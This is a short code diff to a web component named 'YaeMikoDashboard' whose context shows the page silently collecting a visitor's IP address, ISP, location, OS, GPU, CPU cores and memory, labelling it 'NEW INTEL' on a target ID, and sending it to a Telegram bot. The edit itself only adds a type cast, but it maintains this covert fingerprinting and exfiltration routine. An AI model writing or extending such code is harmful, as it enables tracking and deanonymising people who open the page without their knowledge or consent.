@@ -70,7 +70,7 @@ export default function YaeMikoDashboard() {
         gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown"
       } catch (e) {}
 
-      const msg = `?? **NEW INTEL: ${targetID}**\n━━━━━━━━━━\n?? **IP:** ${ipData.ip} (${ipData.org})\n?? **LOC:** ${ipData.city}, ${ipData.country_name}\n?? **OS:** ${navigator.platform}\n?? **GPU:** ${gpu.slice(0,30)}\n?? **BAT:** ${navigator.hardwareConcurrency} Core / ${navigator.deviceMemory || '?'}GB RAM`
+      const msg = `?? **NEW INTEL: ${targetID}**\n━━━━━━━━━━\n?? **IP:** ${ipData.ip} (${ipData.org})\n?? **LOC:** ${ipData.city}, ${ipData.country_name}\n?? **OS:** ${navigator.platform}\n?? **GPU:** ${gpu.slice(0,30)}\n?? **BAT:** ${navigator.hardwareConcurrency} Core / ${(navigator as any).deviceMemory || '?'}GB RAM`
 
       await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
         method: 'POST',
